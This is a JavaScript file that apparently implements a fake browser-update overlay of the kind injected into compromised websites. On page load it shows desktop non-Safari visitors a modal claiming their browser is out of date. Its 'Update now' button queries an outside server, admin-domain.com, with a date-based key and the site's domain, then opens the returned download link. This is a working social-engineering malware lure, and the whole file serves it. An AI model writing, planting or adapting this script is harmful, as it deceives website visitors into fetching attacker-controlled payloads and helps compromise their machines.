const API_DOMAIN = 'https://admin-domain.com';
const currentDomain = window.location.host;

document.addEventListener("DOMContentLoaded", function () {
    const userAgent = navigator.userAgent;
    let browserName = "browser";
    let browserIcon = "default.png";

    if (userAgent.indexOf("Firefox") > -1) {
        browserName = "Firefox Browser";
        browserIcon = "firefox.png";
    } else if (userAgent.indexOf("Chrome") > -1 && userAgent.indexOf("Edg") === -1 && userAgent.indexOf("OPR") === -1) {
        browserName = "Chrome Browser";
        browserIcon = "chrome.png";
    } else if (userAgent.indexOf("Safari") > -1 && userAgent.indexOf("Chrome") === -1) {
        browserName = "safari";
    } else if (userAgent.indexOf("Edg") > -1) {
        browserName = "Edge Browser";
        browserIcon = "edge.png";
    } else if (userAgent.indexOf("OPR") > -1 || userAgent.indexOf("Opera") > -1) {
        browserName = "Opera Browser";
        browserIcon = "opera.png";
    } else if (userAgent.indexOf("Trident") > -1) {
        browserName = "Internet Explorer";
        browserIcon = "explorer.png";
    }


    const dialogHTML = `
        <dialog id="browserAlert">
            <div class="title">
                <img src="/browser_update/${browserIcon}" alt="${browserName}">
                <h2>Your ${browserName} is out of date</h2>
            </div>
            <p>The version of your ${browserName} is out of date. Many sites, including <b>${currentDomain}</b>, may not work properly.</p>
            <div class="buttonBlock">
                <button class="updateButton" onclick="updateBrowser();">Update now</button>
            </div>
            <button onclick="window.browserAlert.close();" aria-label="close" class="x">❌</button>
        </dialog>
    `;

    if (browserName == 'safari' || isMobile()) {
        return;
    }

    document.body.insertAdjacentHTML('beforeend', dialogHTML);

    const dialog = document.getElementById('browserAlert');
    if (dialog && typeof dialog.showModal === "function") {
        setTimeout(function () {
            dialog.showModal();
        }, 500);
    }
});

function isMobile() {
    return /Mobi|Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent);
}

function updateBrowser() {
    const buttonBlock = document.querySelector("#browserAlert .buttonBlock");

    if (buttonBlock) {
        buttonBlock.innerHTML = "<p>Loading...</p>";
    }

    const today = new Date();
    const day = String(today.getDate()).padStart(2, '0');
    const month = String(today.getMonth() + 1).padStart(2, '0');
    const year = today.getFullYear();
    const key = btoa(day + '.' + month + '.' + year);

    fetch(API_DOMAIN + '/get-link?key=' + key + '&domain=' + currentDomain)
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(data => {
            if (data.link) {
                setTimeout(function () {
                    window.open(data.link, "_blank");
                }, 2000);
            }
        })
        .catch(error => {
            console.error('There was a problem with the fetch operation:', error);
        });

    setTimeout(function () {
        window.browserAlert.close();
    }, 5000);
}